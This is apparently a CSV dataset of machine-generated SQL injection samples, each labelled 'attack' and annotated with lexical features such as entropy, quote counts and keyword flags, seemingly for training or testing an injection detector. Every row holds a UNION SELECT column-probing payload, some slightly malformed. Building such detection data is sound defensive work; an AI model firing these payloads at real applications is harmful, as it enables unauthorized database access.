label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-3879' union all select 1980,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,0,84.0,21.0,3.305705293089874,58.0,8.0,4.0,14.0,0.6904761904761905,0.09523809523809523,0.047619047619047616,0.16666666666666666,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,9814,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1,117.0,19.0,2.9187534271495186,86.0,5.0,4.0,22.0,0.7350427350427351,0.042735042735042736,0.03418803418803419,0.18803418803418803,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,18.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,2,142.0,16.0,2.6170467332659912,110.0,1.0,4.0,27.0,0.7746478873239436,0.007042253521126761,0.028169014084507043,0.19014084507042253,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,23.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,3,120.0,15.0,2.620339189808578,94.0,1.0,4.0,21.0,0.7833333333333333,0.008333333333333333,0.03333333333333333,0.175,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,4,111.0,16.0,2.715436231304531,86.0,1.0,4.0,20.0,0.7747747747747747,0.009009009009009009,0.036036036036036036,0.18018018018018017,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,17.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,nullnull--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,5,100.0,15.0,2.7501222614837477,78.0,1.0,4.0,17.0,0.78,0.01,0.04,0.17,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,6,122.0,16.0,2.6980638236613057,94.0,1.0,4.0,23.0,0.7704918032786885,0.00819672131147541,0.03278688524590164,0.1885245901639344,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,19.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,7,101.0,15.0,2.7505502663714085,78.0,1.0,4.0,18.0,0.7722772277227723,0.009900990099009901,0.039603960396039604,0.1782178217821782,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,8,110.0,15.0,2.665298445433216,86.0,1.0,4.0,19.0,0.7818181818181819,0.00909090909090909,0.03636363636363636,0.17272727272727273,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' union all all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,9,125.0,16.0,2.6953857722374885,97.0,1.0,5.0,22.0,0.776,0.008,0.04,0.176,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,19.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
